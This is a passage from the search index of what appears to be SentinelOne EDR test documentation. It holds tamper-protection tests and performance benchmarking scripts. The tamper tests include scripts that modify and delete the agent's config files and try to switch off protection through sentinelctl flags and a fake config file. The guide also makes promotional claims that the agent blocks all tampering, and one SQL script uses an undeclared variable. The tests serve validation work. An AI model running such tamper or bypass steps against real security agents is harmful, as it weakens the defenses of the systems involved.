detected\n# - System call monitoring should flag suspicious activity\n</code></pre></p>"},{"location":"testing/kategori-d-security/#d4-configuration-integrity","title":"\u2699\ufe0f D4: Configuration Integrity","text":""},{"location":"testing/kategori-d-security/#tujuan-testing_3","title":"Tujuan Testing","text":"<p>Testing perlindungan terhadap configuration tampering dan policy bypass attempts.</p>"},{"location":"testing/kategori-d-security/#test-scenarios_3","title":"Test Scenarios","text":""},{"location":"testing/kategori-d-security/#d41-configuration-file-tampering","title":"D4.1: Configuration File Tampering","text":"<p>Windows Server: <pre><code># Test configuration protection\n$configPaths = @(\n    \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\config\\agent.conf\",\n    \"C:\\ProgramData\\SentinelOne\\config\\policy.xml\"\n)\n\nforeach($configFile in $configPaths) {\n    if(Test-Path $configFile) {\n        Write-Host \"Testing protection for: $configFile\"\n\n        # Backup original\n        $backupPath = \"$configFile.backup\"\n        Copy-Item $configFile $backupPath -Force\n\n        # Test modification\n        try {\n            \"malicious_config=true\" | Add-Content $configFile\n            Write-Host \"\u274c CRITICAL: Configuration file was modified!\"\n        }\n        catch {\n            Write-Host \"\u2705 PROTECTED: Configuration modification blocked\"\n        }\n\n        # Test deletion\n        try {\n            Remove-Item $configFile -Force\n            Write-Host \"\u274c CRITICAL: Configuration file was deleted!\"\n        }\n        catch {\n            Write-Host \"\u2705 PROTECTED: Configuration deletion blocked\"\n        }\n\n        # Restore if needed\n        if(Test-Path $backupPath) {\n            if(!(Test-Path $configFile)) {\n                Move-Item $backupPath $configFile\n            } else {\n                Remove-Item $backupPath\n            }\n        }\n    }\n}\n</code></pre></p>"},{"location":"testing/kategori-d-security/#d42-policy-bypass-attempts","title":"D4.2: Policy Bypass Attempts","text":"<p>Windows &amp; Linux: <pre><code># Test policy bypass mechanisms\necho \"Testing policy bypass protection...\"\n\n# Test 1: Environment variable manipulation\nexport SENTINELONE_DISABLE=1\nexport SENTINELONE_DEBUG=1\n\n# Test 2: Command line parameter bypass\nsentinelctl --disable-protection 2&gt;&amp;1\nsentinelctl --bypass-policy 2&gt;&amp;1\n\n# Test 3: Configuration override attempts\necho \"protection_enabled=false\" &gt;&gt; /tmp/fake_config.conf\nsentinelctl --config /tmp/fake_config.conf 2&gt;&amp;1\n\n# Expected Results:\n# - Policy bypass attempts should be ignored\n# - Configuration integrity should be maintained\n# - Unauthorized configuration sources should be rejected\n</code></pre></p>"},{"location":"testing/kategori-d-security/#security-hardening-metrics","title":"\ud83d\udcca Security Hardening Metrics","text":""},{"location":"testing/kategori-d-security/#key-performance-indicators","title":"Key Performance Indicators","text":"Test Case Success Criteria Validation Method Tamper Protection 100% blocking rate Registry/file/process protection Privilege Escalation &gt;99% detection rate UAC bypass/sudo escalation tests Self-Protection 0% successful attacks DLL injection/code cave attempts Configuration Integrity 100% protection Config tampering attempts"},{"location":"testing/kategori-d-security/#validation-checklist","title":"Validation Checklist","text":""},{"location":"testing/kategori-d-security/#tamper-resistance-validation","title":"Tamper Resistance Validation","text":"<ul> <li>[ ] Registry Protection: All registry modification attempts blocked</li> <li>[ ] File System Protection: Critical files cannot be modified/deleted</li> <li>[ ] Process Protection: Agent processes cannot be terminated</li> <li>[ ] Service Protection: Services cannot be stopped/disabled</li> <li>[ ] Driver Protection: Kernel components are tamper-proof</li> </ul>"},{"location":"testing/kategori-d-security/#advanced-attack-prevention","title":"Advanced Attack Prevention","text":"<ul> <li>[ ] Code Injection: DLL/code injection attempts blocked</li> <li>[ ] Memory Protection: Process memory is protected from manipulation</li> <li>[ ] Kernel Protection: Kernel-level attacks are prevented</li> <li>[ ] Privilege Escalation: Escalation attempts are detected/blocked</li> <li>[ ] Configuration Integrity: Settings cannot be bypassed/modified</li> </ul>"},{"location":"testing/kategori-d-security/#demo-presentation-points","title":"Demo Presentation Points","text":""},{"location":"testing/kategori-d-security/#executive-summary","title":"Executive Summary","text":"<ol> <li>\"Military-Grade Tamper Protection\"</li> <li>Agent cannot be disabled even by administrators</li> <li>Self-protection mechanisms prevent all tampering attempts</li> <li> <p>Maintains security posture under sophisticated attacks</p> </li> <li> <p>\"Advanced Attack Resistance\"</p> </li> <li>Prevents privilege escalation attempts</li> <li>Blocks code injection and memory manipulation</li> <li> <p>Protects against kernel-level attacks</p> </li> <li> <p>\"Configuration Security\"</p> </li> <li>Policy settings cannot be bypassed</li> <li>Configuration integrity is maintained</li> <li>No unauthorized modifications possible</li> </ol>"},{"location":"testing/kategori-d-security/#technical-demonstrations","title":"Technical Demonstrations","text":"<ul> <li>Live tamper protection testing</li> <li>Privilege escalation prevention demo</li> <li>Advanced attack resistance validation</li> <li>Configuration integrity verification</li> </ul>"},{"location":"testing/kategori-d-security/#next-steps","title":"Next Steps","text":"<p>Continue to performance and integration testing: - Kategori E: Performance Impact - Kategori F: Integration Testing</p> <p>Security Critical</p> <p>Kategori D testing demonstrates the hardcore security capabilities that differentiate SentinelOne from traditional antivirus solutions. This is crucial for convincing stakeholders about advanced threat protection.</p>"},{"location":"testing/kategori-e-performance/","title":"Kategori E: Performance Impact Testing","text":""},{"location":"testing/kategori-e-performance/#overview","title":"Overview","text":"<p>Testing komprehensif dampak performance SentinelOne EDR terhadap sistem server, aplikasi, dan workload production. Validasi bahwa security tidak mengorbankan performance dan availability sistem kritis.</p>"},{"location":"testing/kategori-e-performance/#e1-cpumemory-utilization","title":"\ud83d\udcca E1: CPU/Memory Utilization","text":""},{"location":"testing/kategori-e-performance/#tujuan-testing","title":"Tujuan Testing","text":"<p>Mengukur resource consumption SentinelOne dan dampaknya terhadap overall system performance dalam berbagai kondisi workload.</p>"},{"location":"testing/kategori-e-performance/#test-scenarios","title":"Test Scenarios","text":""},{"location":"testing/kategori-e-performance/#e11-baseline-performance-measurement","title":"E1.1: Baseline Performance Measurement","text":"<p>Windows Server: <pre><code># Pre-SentinelOne baseline measurement\nWrite-Host \"=== BASELINE PERFORMANCE MEASUREMENT (Before SentinelOne) ===\"\n\n# CPU baseline\n$cpuBaseline = @()\nfor($i = 1; $i -le 60; $i++) {\n    $cpu = (Get-WmiObject win32_processor | Measure-Object -property LoadPercentage -Average).Average\n    $cpuBaseline += $cpu\n    Write-Progress -Activity \"Measuring CPU baseline\" -PercentComplete ($i/60*100)\n    Start-Sleep 1\n}\n$avgCpuBaseline = ($cpuBaseline | Measure-Object -Average).Average\n\n# Memory baseline\n$memTotal = (Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB\n$memAvailable = (Get-Counter \"\\Memory\\Available MBytes\").CounterSamples.CookedValue / 1024\n$memUsedBaseline = $memTotal - $memAvailable\n\nWrite-Host \"CPU Baseline: $([math]::Round($avgCpuBaseline, 2))%\"\nWrite-Host \"Memory Baseline: $([math]::Round($memUsedBaseline, 2)) GB / $([math]::Round($memTotal, 2)) GB\"\n\n# Save baseline untuk comparison\n$baseline = @{\n    'CPU' = $avgCpuBaseline\n    'Memory' = $memUsedBaseline\n    'Timestamp' = Get-Date\n}\n$baseline | ConvertTo-Json | Out-File \"C:\\temp\\performance_baseline.json\"\n</code></pre></p> <p>Linux Server: <pre><code>#!/bin/bash\necho \"=== BASELINE PERFORMANCE MEASUREMENT (Before SentinelOne) ===\"\n\n# CPU baseline measurement\necho \"Measuring CPU baseline for 60 seconds...\"\ncpu_baseline=0\nfor i in {1..60}; do\n    cpu_usage=$(top -bn1 | grep \"Cpu(s)\" | awk '{print $2}' | cut -d'%' -f1)\n    cpu_baseline=$(echo \"$cpu_baseline + $cpu_usage\" | bc)\n    sleep 1\ndone\navg_cpu_baseline=$(echo \"scale=2; $cpu_baseline / 60\" | bc)\n\n# Memory baseline\nmem_total=$(free -g | awk '/^Mem:/{print $2}')\nmem_used_baseline=$(free -g | awk '/^Mem:/{print $3}')\nmem_available=$(free -g | awk '/^Mem:/{print $7}')\n\necho \"CPU Baseline: ${avg_cpu_baseline}%\"\necho \"Memory Baseline: ${mem_used_baseline} GB / ${mem_total} GB\"\n\n# Save baseline\ncat &gt; /tmp/performance_baseline.json &lt;&lt; EOF\n{\n    \"cpu\": $avg_cpu_baseline,\n    \"memory_used\": $mem_used_baseline,\n    \"memory_total\": $mem_total,\n    \"timestamp\": \"$(date -Iseconds)\"\n}\nEOF\n</code></pre></p>"},{"location":"testing/kategori-e-performance/#e12-sentinelone-resource-consumption","title":"E1.2: SentinelOne Resource Consumption","text":"<p>Windows Server: <pre><code># Measure SentinelOne specific resource usage\nWrite-Host \"=== SENTINELONE RESOURCE CONSUMPTION ===\"\n\n# Get all SentinelOne processes\n$sentinelProcesses = Get-Process -Name \"*Sentinel*\" -ErrorAction SilentlyContinue\n\nif($sentinelProcesses) {\n    Write-Host \"SentinelOne Processes Found:\"\n\n    $totalCpu = 0\n    $totalMemory = 0\n\n    foreach($process in $sentinelProcesses) {\n        $cpu = $process.CPU\n        $memory = [math]::Round($process.WorkingSet / 1MB, 2)\n\n        Write-Host \"- $($process.ProcessName): CPU=$cpu, Memory=$memory MB\"\n\n        $totalMemory += $memory\n        if($cpu) { $totalCpu += $cpu }\n    }\n\n    Write-Host \"Total SentinelOne Resource Usage:\"\n    Write-Host \"- CPU: $totalCpu seconds\"\n    Write-Host \"- Memory: $totalMemory MB\"\n\n    # Calculate percentage impact\n    $baseline = Get-Content \"C:\\temp\\performance_baseline.json\" | ConvertFrom-Json\n    $memoryImpactPercent = [math]::Round(($totalMemory / 1024) / ($baseline.Memory) * 100, 2)\n\n    Write-Host \"Memory Impact: $memoryImpactPercent% of baseline memory usage\"\n\n} else {\n    Write-Host \"No SentinelOne processes found!\"\n}\n\n# Real-time monitoring for 5 minutes\nWrite-Host \"`n=== REAL-TIME MONITORING (5 minutes) ===\"\n$monitoringData = @()\n\nfor($i = 1; $i -le 300; $i++) {\n    $sentinelProcesses = Get-Process -Name \"*Sentinel*\" -ErrorAction SilentlyContinue\n    $timestamp = Get-Date\n\n    $cpuTotal = (Get-WmiObject win32_processor | Measure-Object -property LoadPercentage -Average).Average\n    $memAvailable = (Get-Counter \"\\Memory\\Available MBytes\").CounterSamples.CookedValue / 1024\n    $memUsed = $memTotal - $memAvailable\n\n    $sentinelMemory = 0\n    if($sentinelProcesses) {\n        $sentinelMemory = ($sentinelProcesses | Measure-Object WorkingSet -Sum).Sum / 1MB\n    }\n\n    $dataPoint = [PSCustomObject]@{\n        Timestamp = $timestamp\n        SystemCPU = $cpuTotal\n        SystemMemory = $memUsed\n        SentinelMemory = $sentinelMemory\n    }\n\n    $monitoringData += $dataPoint\n\n    if($i % 30 -eq 0) {\n        Write-Host \"[$i/300] CPU: $cpuTotal%, Memory: $([math]::Round($memUsed, 2))GB, Sentinel: $([math]::Round($sentinelMemory, 2))MB\"\n    }\n\n    Start-Sleep 1\n}\n\n# Export monitoring data\n$monitoringData | Export-Csv \"C:\\temp\\sentinelone_performance_monitoring.csv\" -NoTypeInformation\n</code></pre></p>"},{"location":"testing/kategori-e-performance/#e13-performance-under-load","title":"E1.3: Performance Under Load","text":"<p>Windows Server Stress Test: <pre><code># Create controlled system load\nWrite-Host \"=== PERFORMANCE UNDER LOAD TESTING ===\"\n\n# CPU stress test\n$cpuStressJobs = @()\nfor($i = 1; $i -le 4; $i++) {\n    $job = Start-Job -ScriptBlock {\n        $start = Get-Date\n        while((Get-Date) -lt $start.AddMinutes(10)) {\n            $result = 1\n            for($j = 1; $j -le 10000; $j++) {\n                $result = $result * $j % 1000000\n            }\n        }\n    }\n    $cpuStressJobs += $job\n    Write-Host \"Started CPU stress job $i\"\n}\n\n# Monitor performance during stress\n$stressData = @()\n$startTime = Get-Date\n\nwhile($cpuStressJobs | Where-Object {$_.State -eq \"Running\"}) {\n    $currentTime = Get-Date\n    $elapsedMinutes = ($currentTime - $startTime).TotalMinutes\n\n    # System metrics\n    $cpuUsage = (Get-WmiObject win32_processor | Measure-Object -property LoadPercentage -Average).Average\n    $memAvailable = (Get-Counter \"\\Memory\\Available MBytes\").CounterSamples.CookedValue / 1024\n    $memUsed = $memTotal - $memAvailable\n\n    # SentinelOne metrics\n    $sentinelProcesses = Get-Process -Name \"*Sentinel*\" -ErrorAction SilentlyContinue\n    $sentinelMemory = 0\n    $sentinelCpu = 0\n\n    if($sentinelProcesses) {\n        $sentinelMemory = ($sentinelProcesses | Measure-Object WorkingSet -Sum).Sum / 1MB\n        # Note: CPU measurement during stress requires different approach\n    }\n\n    $stressDataPoint = [PSCustomObject]@{\n        ElapsedMinutes = [math]::Round($elapsedMinutes, 2)\n        SystemCPU = $cpuUsage\n        SystemMemory = [math]::Round($memUsed, 2)\n        SentinelMemory = [math]::Round($sentinelMemory, 2)\n        TestPhase = \"CPU_Stress\"\n    }\n\n    $stressData += $stressDataPoint\n    Write-Host \"Stress Test [$([math]::Round($elapsedMinutes, 1))min]: CPU=$cpuUsage%, Sys Mem=$([math]::Round($memUsed, 2))GB, S1 Mem=$([math]::Round($sentinelMemory, 2))MB\"\n\n    Start-Sleep 10\n}\n\n# Clean up stress jobs\n$cpuStressJobs | Remove-Job -Force\nWrite-Host \"CPU stress test completed\"\n\n# Export stress test data\n$stressData | Export-Csv \"C:\\temp\\sentinelone_stress_test.csv\" -NoTypeInformation\n</code></pre></p>"},{"location":"testing/kategori-e-performance/#e2-disk-io-impact","title":"\ud83d\udcbe E2: Disk I/O Impact","text":""},{"location":"testing/kategori-e-performance/#tujuan-testing_1","title":"Tujuan Testing","text":"<p>Mengukur dampak SentinelOne terhadap disk I/O performance dan storage utilization.</p>"},{"location":"testing/kategori-e-performance/#test-scenarios_1","title":"Test Scenarios","text":""},{"location":"testing/kategori-e-performance/#e21-file-system-performance","title":"E2.1: File System Performance","text":"<p>Windows Server: <pre><code>Write-Host \"=== DISK I/O PERFORMANCE TESTING ===\"\n\n# Baseline disk performance test\nfunction Test-DiskPerformance {\n    param($TestName, $FilePath, $FileSizeMB = 100)\n\n    Write-Host \"Testing: $TestName\"\n\n    # Write test\n    $writeStart = Get-Date\n    $data = New-Object byte[] (1024 * 1024)  # 1MB chunks\n    $stream = [System.IO.File]::Create($FilePath)\n\n    for($i = 0; $i -lt $FileSizeMB; $i++) {\n        $stream.Write($data, 0, $data.Length)\n    }\n    $stream.Close()\n    $writeTime = (Get-Date) - $writeStart\n    $writeSpeed = [math]::Round($FileSizeMB / $writeTime.TotalSeconds, 2)\n\n    # Read test\n    $readStart = Get-Date\n    $content = [System.IO.File]::ReadAllBytes($FilePath)\n    $readTime = (Get-Date) - $readStart\n    $readSpeed = [math]::Round($FileSizeMB / $readTime.TotalSeconds, 2)\n\n    # Clean up\n    Remove-Item $FilePath -Force\n\n    return @{\n        WriteSpeed = $writeSpeed\n        ReadSpeed = $readSpeed\n        WriteTime = $writeTime.TotalSeconds\n        ReadTime = $readTime.TotalSeconds\n    }\n}\n\n# Test different file types and locations\n$diskTests = @(\n    @{Name=\"System Drive\"; Path=\"C:\\temp\\disktest.dat\"},\n    @{Name=\"Large File\"; Path=\"C:\\temp\\largefile.dat\"; Size=500},\n    @{Name=\"Multiple Small Files\"; Path=\"C:\\temp\\smallfile\"; Size=10}\n)\n\n$diskResults = @()\nforeach($test in $diskTests) {\n    $size = if($test.Size) { $test.Size } else { 100 }\n    $result = Test-DiskPerformance -TestName $test.Name -FilePath $test.Path -FileSizeMB $size\n\n    $diskResults += [PSCustomObject]@{\n        TestName = $test.Name\n        FileSize = $size\n        WriteSpeedMBps = $result.WriteSpeed\n        ReadSpeedMBps = $result.ReadSpeed\n        WriteTimeSeconds = $result.WriteTime\n        ReadTimeSeconds = $result.ReadTime\n    }\n\n    Write-Host \"- Write: $($result.WriteSpeed) MB/s, Read: $($result.ReadSpeed) MB/s\"\n}\n\n$diskResults | Export-Csv \"C:\\temp\\disk_performance_results.csv\" -NoTypeInformation\n</code></pre></p> <p>Linux Server: <pre><code>#!/bin/bash\necho \"=== DISK I/O PERFORMANCE TESTING ===\"\n\n# Function to test disk performance\ntest_disk_performance() {\n    local test_name=$1\n    local file_path=$2\n    local file_size_mb=${3:-100}\n\n    echo \"Testing: $test_name\"\n\n    # Write test\n    echo \"Write test...\"\n    write_start=$(date +%s.%N)\n    dd if=/dev/zero of=\"$file_path\" bs=1M count=$file_size_mb 2&gt;/dev/null\n    write_end=$(date +%s.%N)\n    sync  # Ensure data is written to disk\n\n    write_time=$(echo \"$write_end - $write_start\" | bc)\n    write_speed=$(echo \"scale=2; $file_size_mb / $write_time\" | bc)\n\n    # Read test\n    echo \"Read test...\"\n    # Clear cache first\n    sudo sh -c 'echo 3 &gt; /proc/sys/vm/drop_caches'\n\n    read_start=$(date +%s.%N)\n    dd if=\"$file_path\" of=/dev/null bs=1M 2&gt;/dev/null\n    read_end=$(date +%s.%N)\n\n    read_time=$(echo \"$read_end - $read_start\" | bc)\n    read_speed=$(echo \"scale=2; $file_size_mb / $read_time\" | bc)\n\n    # Clean up\n    rm -f \"$file_path\"\n\n    echo \"- Write: ${write_speed} MB/s, Read: ${read_speed} MB/s\"\n\n    # Log results\n    echo \"$test_name,$file_size_mb,$write_speed,$read_speed,$write_time,$read_time\" &gt;&gt; /tmp/disk_performance_results.csv\n}\n\n# Initialize results file\necho \"TestName,FileSizeMB,WriteSpeedMBps,ReadSpeedMBps,WriteTimeSeconds,ReadTimeSeconds\" &gt; /tmp/disk_performance_results.csv\n\n# Run tests\ntest_disk_performance \"System Drive\" \"/tmp/disktest.dat\" 100\ntest_disk_performance \"Large File\" \"/tmp/largefile.dat\" 500\ntest_disk_performance \"Small Files\" \"/tmp/smallfile.dat\" 10\n\necho \"Disk performance testing completed\"\n</code></pre></p>"},{"location":"testing/kategori-e-performance/#e22-sentinelone-storage-usage","title":"E2.2: SentinelOne Storage Usage","text":"<p>Windows &amp; Linux: <pre><code># Windows - Analyze SentinelOne storage usage\nWrite-Host \"=== SENTINELONE STORAGE ANALYSIS ===\"\n\n$sentinelPaths = @(\n    \"C:\\Program Files\\SentinelOne\",\n    \"C:\\ProgramData\\SentinelOne\",\n    \"$env:TEMP\\SentinelOne\"\n)\n\n$totalSize = 0\nforeach($path in $sentinelPaths) {\n    if(Test-Path $path) {\n        $size = (Get-ChildItem $path -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum / 1MB\n        Write-Host \"- $path: $([math]::Round($size, 2)) MB\"\n        $totalSize += $size\n    }\n}\n\nWrite-Host \"Total SentinelOne Storage Usage: $([math]::Round($totalSize, 2)) MB\"\n\n# Check for large log files\n$logFiles = Get-ChildItem \"C:\\ProgramData\\SentinelOne\" -Filter \"*.log\" -Recurse -ErrorAction SilentlyContinue\nif($logFiles) {\n    Write-Host \"`nLog Files Analysis:\"\n    foreach($log in $logFiles) {\n        $sizeMB = $log.Length / 1MB\n        Write-Host \"- $($log.Name): $([math]::Round($sizeMB, 2)) MB\"\n    }\n}\n</code></pre></p> <pre><code># Linux - Analyze SentinelOne storage usage\necho \"=== SENTINELONE STORAGE ANALYSIS ===\"\n\nsentinel_paths=(\n    \"/opt/sentinelone\"\n    \"/var/lib/sentinelone\"\n    \"/var/log/sentinelone\"\n    \"/tmp/sentinelone\"\n)\n\ntotal_size=0\nfor path in \"${sentinel_paths[@]}\"; do\n    if [ -d \"$path\" ]; then\n        size=$(du -sm \"$path\" 2&gt;/dev/null | cut -f1)\n        echo \"- $path: ${size} MB\"\n        total_size=$((total_size + size))\n    fi\ndone\n\necho \"Total SentinelOne Storage Usage: ${total_size} MB\"\n\n# Check log file sizes\necho -e \"\\nLog Files Analysis:\"\nfind /var/log/sentinelone -name \"*.log\" -exec du -sh {} \\; 2&gt;/dev/null | sort -hr\n</code></pre>"},{"location":"testing/kategori-e-performance/#e3-network-latency-testing","title":"\ud83c\udf10 E3: Network Latency Testing","text":""},{"location":"testing/kategori-e-performance/#tujuan-testing_2","title":"Tujuan Testing","text":"<p>Mengukur dampak SentinelOne terhadap network performance dan latency.</p>"},{"location":"testing/kategori-e-performance/#test-scenarios_2","title":"Test Scenarios","text":""},{"location":"testing/kategori-e-performance/#e31-network-throughput-analysis","title":"E3.1: Network Throughput Analysis","text":"<p>Windows Server: <pre><code>Write-Host \"=== NETWORK PERFORMANCE TESTING ===\"\n\n# Test network throughput to various destinations\n$testTargets = @(\n    @{Name=\"Local Gateway\"; Address=\"192.168.1.1\"},\n    @{Name=\"Public DNS\"; Address=\"8.8.8.8\"},\n    @{Name=\"External Host\"; Address=\"google.com\"}\n)\n\n$networkResults = @()\n\nforeach($target in $testTargets) {\n    Write-Host \"Testing network to: $($target.Name) ($($target.Address))\"\n\n    # Ping test for latency\n    $pingResults = Test-Connection $target.Address -Count 10 -ErrorAction SilentlyContinue\n    if($pingResults) {\n        $avgLatency = ($pingResults | Measure-Object ResponseTime -Average).Average\n        $minLatency = ($pingResults | Measure-Object ResponseTime -Minimum).Minimum\n        $maxLatency = ($pingResults | Measure-Object ResponseTime -Maximum).Maximum\n        $packetLoss = (10 - $pingResults.Count) / 10 * 100\n\n        $networkResults += [PSCustomObject]@{\n            Target = $target.Name\n            Address = $target.Address\n            AvgLatencyMs = [math]::Round($avgLatency, 2)\n            MinLatencyMs = $minLatency\n            MaxLatencyMs = $maxLatency\n            PacketLossPercent = $packetLoss\n        }\n\n        Write-Host \"- Avg Latency: $([math]::Round($avgLatency, 2))ms, Packet Loss: $packetLoss%\"\n    }\n}\n\n$networkResults | Export-Csv \"C:\\temp\\network_performance_results.csv\" -NoTypeInformation\n</code></pre></p> <p>Linux Server: <pre><code>#!/bin/bash\necho \"=== NETWORK PERFORMANCE TESTING ===\"\n\n# Test targets\ndeclare -A test_targets\ntest_targets[Local_Gateway]=\"192.168.1.1\"\ntest_targets[Public_DNS]=\"8.8.8.8\"\ntest_targets[External_Host]=\"google.com\"\n\n# Initialize results file\necho \"Target,Address,AvgLatencyMs,MinLatencyMs,MaxLatencyMs,PacketLossPercent\" &gt; /tmp/network_performance_results.csv\n\nfor target_name in \"${!test_targets[@]}\"; do\n    address=\"${test_targets[$target_name]}\"\n    echo \"Testing network to: $target_name ($address)\"\n\n    # Ping test\n    ping_result=$(ping -c 10 \"$address\" 2&gt;/dev/null)\n\n    if [ $? -eq 0 ]; then\n        # Parse ping statistics\n        avg_latency=$(echo \"$ping_result\" | tail -1 | awk -F '/' '{print $5}')\n        min_latency=$(echo \"$ping_result\" | tail -1 | awk -F '/' '{print $4}')\n        max_latency=$(echo \"$ping_result\" | tail -1 | awk -F '/' '{print $6}')\n\n        # Calculate packet loss\n        packet_loss=$(echo \"$ping_result\" | grep \"packet loss\" | awk '{print $6}' | sed 's/%//')\n\n        echo \"- Avg Latency: ${avg_latency}ms, Packet Loss: ${packet_loss}%\"\n\n        # Log results\n        echo \"$target_name,$address,$avg_latency,$min_latency,$max_latency,$packet_loss\" &gt;&gt; /tmp/network_performance_results.csv\n    else\n        echo \"- Failed to reach $address\"\n        echo \"$target_name,$address,FAILED,FAILED,FAILED,100\" &gt;&gt; /tmp/network_performance_results.csv\n    fi\ndone\n</code></pre></p>"},{"location":"testing/kategori-e-performance/#e32-bandwidth-impact-measurement","title":"E3.2: Bandwidth Impact Measurement","text":"<p>Network Bandwidth Test: <pre><code># Test bandwidth with and without SentinelOne deep packet inspection\necho \"=== BANDWIDTH IMPACT TESTING ===\"\n\n# Install iperf3 if needed\nif ! command -v iperf3 &amp;&gt; /dev/null; then\n    echo \"Installing iperf3...\"\n    sudo apt update &amp;&amp; sudo apt install iperf3 -y\nfi\n\n# Note: Requires iperf3 server on another machine\n# Replace SERVER_IP with actual iperf3 server\nSERVER_IP=\"192.168.1.100\"\n\nif ping -c 1 \"$SERVER_IP\" &amp;&gt; /dev/null; then\n    echo \"Testing bandwidth to iperf3 server: $SERVER_IP\"\n\n    # TCP bandwidth test\n    echo \"TCP bandwidth test (10 seconds):\"\n    iperf3 -c \"$SERVER_IP\" -t 10 -f M\n\n    # UDP bandwidth test\n    echo \"UDP bandwidth test (10 seconds):\"\n    iperf3 -c \"$SERVER_IP\" -u -t 10 -f M\n\nelse\n    echo \"iperf3 server not reachable at $SERVER_IP\"\n    echo \"Skipping bandwidth tests\"\nfi\n</code></pre></p>"},{"location":"testing/kategori-e-performance/#e4-application-performance","title":"\ud83d\ude80 E4: Application Performance","text":""},{"location":"testing/kategori-e-performance/#tujuan-testing_3","title":"Tujuan Testing","text":"<p>Testing dampak SentinelOne terhadap performance aplikasi bisnis critical.</p>"},{"location":"testing/kategori-e-performance/#test-scenarios_3","title":"Test Scenarios","text":""},{"location":"testing/kategori-e-performance/#e41-database-performance-impact","title":"E4.1: Database Performance Impact","text":"<p>SQL Server Performance Test: <pre><code>-- SQL Server performance testing\nUSE tempdb;\nGO\n\n-- Create test table\nCREATE TABLE PerformanceTest (\n    ID int IDENTITY(1,1) PRIMARY KEY,\n    TestData varchar(255),\n    CreatedDate datetime DEFAULT GETDATE()\n);\nGO\n\n-- Baseline performance test\nDECLARE @StartTime datetime2 = SYSDATETIME();\n\n-- Insert test\nDECLARE @i int = 0;\nWHILE @i &lt; 10000\nBEGIN\n    INSERT INTO PerformanceTest (TestData) \n    VALUES ('Test data row ' + CAST(@i as varchar(10)));\n    SET @i = @i + 1;\nEND\n\nDECLARE @InsertTime float = DATEDIFF(MICROSECOND, @StartTime, SYSDATETIME()) / 1000.0;\nPRINT 'Insert 10,000 rows: ' + CAST(@InsertTime as varchar(20)) + ' ms';\n\n-- Select test  \nSET @StartTime = SYSDATETIME();\nSELECT COUNT(*) FROM PerformanceTest WHERE TestData LIKE '%500%';\nSET @SelectTime = DATEDIFF(MICROSECOND, @StartTime, SYSDATETIME()) / 1000.0;\nPRINT 'Select with LIKE: ' + CAST(@SelectTime as varchar(20)) + ' ms';\n\n-- Update test\nSET @StartTime = SYSDATETIME();\nUPDATE PerformanceTest SET TestData = TestData + ' - Updated' WHERE ID % 100 = 0;\nDECLARE @UpdateTime float = DATEDIFF(MICROSECOND, @StartTime, SYSDATETIME()) / 1000.0;\nPRINT 'Update 100 rows: ' + CAST(@UpdateTime as varchar(20)) + ' ms';\n\n-- Clean up\nDROP TABLE PerformanceTest;\nGO\n</code></pre></p> <p>MySQL/PostgreSQL Performance Test: <pre><code>#!/bin/bash\necho \"=== DATABASE PERFORMANCE TESTING ===\"\n\n# MySQL performance test\nif command -v mysql &amp;&gt; /dev/null; then\n    echo \"Testing MySQL performance...\"\n\n    mysql -u root -p -e \"\n    USE test;\n    DROP TABLE IF EXISTS performance_test;\n    CREATE TABLE performance_test (\n        id INT AUTO_INCREMENT PRIMARY KEY,\n        test_data VARCHAR(255),\n        created_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n    );\n\n    SET @start_time = NOW(6);\n\n    -- Insert test\n    INSERT INTO performance_test (test_data) \n    SELECT CONCAT('Test data row ', n)\n    FROM (\n        SELECT a.N + b.N * 10 + c.N * 100 + d.N * 1000 as n\n        FROM \n        (SELECT 0 as N UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) a,\n        (SELECT 0 as N UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) b,\n        (SELECT 0 as N UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) c,\n        (SELECT 0 as N UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9) d\n    ) numbers\n    WHERE n &lt; 10000;\n\n    SELECT CONCAT('Insert 10,000 rows: ', TIMESTAMPDIFF(MICROSECOND, @start_time, NOW(6))/1000, ' ms') as result;\n    \"\nfi\n</code></pre></p>"},{"location":"testing/kategori-e-performance/#e42-web-application-performance","title":"E4.2: Web Application Performance","text":"<p>IIS/Apache Performance Test: <pre><code># Windows - IIS performance test using WebRequest\nWrite-Host \"=== WEB APPLICATION PERFORMANCE TEST ===\"\n\n$testUrls = @(\n    \"http://localhost/\",\n    \"http://localhost/api/test\",\n    \"http://localhost/static/large-image.jpg\"\n)\n\n$webResults = @()\n\nforeach($url in $testUrls) {\n    Write-Host \"Testing: $url\"\n\n    $responseTimes = @()\n\n    # Make 10 requests to each URL\n    for($i = 1; $i -le 10; $i++) {\n        try {\n            $startTime = Get-Date\n            $response = Invoke-WebRequest $url -TimeoutSec 30\n            $endTime = Get-Date\n\n            $responseTime = ($endTime - $startTime).TotalMilliseconds\n            $responseTimes += $responseTime\n\n            Write-Progress -Activity \"Testing $url\" -PercentComplete ($i/10*100)\n        }\n        catch {\n            Write-Host \"Request $i failed: $($_.Exception.Message)\"\n        }\n    }\n\n    if($responseTimes.Count -gt 0) {\n        $avgResponse = [math]::Round(($responseTimes | Measure-Object -Average).Average, 2)\n        $minResponse = [math]::Round(($responseTimes | Measure-Object -Minimum).Minimum, 2)\n        $maxResponse = [math]::Round(($responseTimes | Measure-Object -Maximum).Maximum, 2)\n\n        $webResults += [PSCustomObject]@{\n            URL = $url\n            AvgResponseTimeMs = $avgResponse\n            MinResponseTimeMs = $minResponse\n            MaxResponseTimeMs = $maxResponse\n            SuccessRate = $responseTimes.Count / 10 * 100\n        }\n\n        Write-Host \"- Avg: ${avgResponse}ms, Min: ${minResponse}ms, Max: ${maxResponse}ms\"\n    }\n}\n\n$webResults | Export-Csv \"C:\\temp\\web_performance_results.csv\" -NoTypeInformation\n</code></pre></p>"},{"location":"testing/kategori-e-performance/#performance-impact-metrics","title":"\ud83d\udcca Performance Impact 